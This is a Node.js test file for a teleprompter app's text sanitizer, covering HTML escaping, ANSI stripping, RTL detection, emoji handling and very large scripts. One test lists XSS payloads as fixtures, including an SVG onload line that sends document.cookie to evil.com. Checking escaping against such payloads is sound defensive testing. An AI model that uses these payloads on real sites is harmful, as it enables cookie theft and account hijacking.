import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

/**
 * Script Processing & Sanitization Engine.
 * Corresponds to PROJECT.md Feature 8 (SolidJS Launcher UI & Script Management).
 * Handles:
 * - Empty and whitespace-only scripts
 * - High-capacity script payloads (100,000+ words)
 * - Multilingual, RTL (Arabic/Hebrew), and emoji sequence rendering
 * - Cross-site scripting (XSS) input sanitization
 * - Control character stripping and line break normalization
 */
export class ScriptSanitizer {
  static sanitize(text) {
    if (typeof text !== 'string') {
      return '';
    }

    // Strip ANSI escape codes
    let sanitized = text.replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '');

    // Normalize vertical tabs, form feeds, and weird whitespace to standard spaces/newlines
    sanitized = sanitized.replace(/[\f\v]/g, '\n');

    // Normalize line endings to standard LF
    sanitized = sanitized.replace(/\r\n/g, '\n').replace(/\r/g, '\n');

    // HTML entity escaping for XSS prevention
    sanitized = sanitized
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');

    return sanitized;
  }

  static parseWords(text) {
    if (!text || text.trim().length === 0) {
      return [];
    }
    // Match unicode words and emoji sequences
    return text.trim().split(/\s+/);
  }

  static detectRtl(text) {
    // Check for Hebrew (0590-05FF) or Arabic (0600-06FF) unicode ranges
    const rtlRegex = /[\u0590-\u05FF\u0600-\u06FF]/;
    return rtlRegex.test(text);
  }
}

describe('B08: UI Extreme Scripts & Sanitization Boundary Cases', () => {
  it('1. should handle empty script bodies and whitespace-only text gracefully', () => {
    const emptyScript = { id: 's-empty', title: '', body: '' };
    const sanitizedBody = ScriptSanitizer.sanitize(emptyScript.body);
    const words = ScriptSanitizer.parseWords(sanitizedBody);

    assert.strictEqual(sanitizedBody, '');
    assert.strictEqual(words.length, 0);

    const whitespaceScript = { id: 's-white', title: 'Spaces', body: '   \n  \t  \r\n  ' };
    const sanitizedWhite = ScriptSanitizer.sanitize(whitespaceScript.body);
    const whiteWords = ScriptSanitizer.parseWords(sanitizedWhite);
    assert.strictEqual(whiteWords.length, 0);
  });

  it('2. should process ultra-large scripts (100,000 words) without memory exhaustion or truncation', () => {
    // Generate 100,000 words
    const sampleWord = 'Teleprompter';
    const wordCount = 100000;
    const hugeText = Array(wordCount).fill(sampleWord).join(' ');

    const startTime = performance.now();
    const sanitized = ScriptSanitizer.sanitize(hugeText);
    const words = ScriptSanitizer.parseWords(sanitized);
    const elapsed = performance.now() - startTime;

    assert.strictEqual(words.length, wordCount);
    // Processing should be fast (< 500ms in Node)
    assert.ok(elapsed < 1000, `Processing took ${elapsed}ms, expected < 1000ms`);
  });

  it('3. should preserve complex emojis, unicode flags, and detect RTL Arabic/Hebrew script correctly', () => {
    const arabicText = 'مرحبا بكم في تطبيق الملقن غير المرئي'; // "Welcome to the invisible teleprompter app"
    assert.strictEqual(ScriptSanitizer.detectRtl(arabicText), true);

    const hebrewText = 'שלום וברוכים הבאים לטלפרומפטר';
    assert.strictEqual(ScriptSanitizer.detectRtl(hebrewText), true);

    const englishText = 'Invisible desktop teleprompter for presentation';
    assert.strictEqual(ScriptSanitizer.detectRtl(englishText), false);

    // Emoji sequences: flags, family, compound modifiers
    const emojiScript = 'Welcome 🎙️ 🚀 👨‍👩‍👧‍👦 🇦🇷 🇺🇸 🎬';
    const sanitized = ScriptSanitizer.sanitize(emojiScript);
    assert.ok(sanitized.includes('🎙️'));
    assert.ok(sanitized.includes('🇦🇷'));
  });

  it('4. should neutralize malicious HTML and script injection attempts (XSS attack vectors)', () => {
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '<img src="x" onerror="stealData()"/>',
      '<svg onload=fetch("http://evil.com/"+document.cookie)>',
      'javascript:void(0)',
      '<iframe src="https://malicious.example.com"></iframe>'
    ];

    for (const input of maliciousInputs) {
      const clean = ScriptSanitizer.sanitize(input);
      assert.ok(!clean.includes('<script>'));
      assert.ok(!clean.includes('<img'));
      assert.ok(!clean.includes('<svg'));
      assert.ok(!clean.includes('<iframe'));
      assert.ok(clean.includes('&lt;') || !clean.includes('<'));
    }
  });

  it('5. should sanitize ANSI escape sequences, form feeds, and irregular control characters', () => {
    // Terminal ANSI colored text copied from console
    const ansiText = '\x1b[31mRed Alert:\x1b[0m \x1b[1mImportant Announcement\x1b[0m\fPage 2 text\vNext item';
    const cleaned = ScriptSanitizer.sanitize(ansiText);

    // ANSI escape sequences must be stripped
    assert.ok(!cleaned.includes('\x1b'));
    assert.ok(!cleaned.includes('[31m'));
    assert.ok(cleaned.includes('Red Alert: Important Announcement'));

    // Form feed and vertical tab converted to newline
    assert.ok(!cleaned.includes('\f'));
    assert.ok(!cleaned.includes('\v'));
    assert.ok(cleaned.includes('Page 2 text'));
  });
});
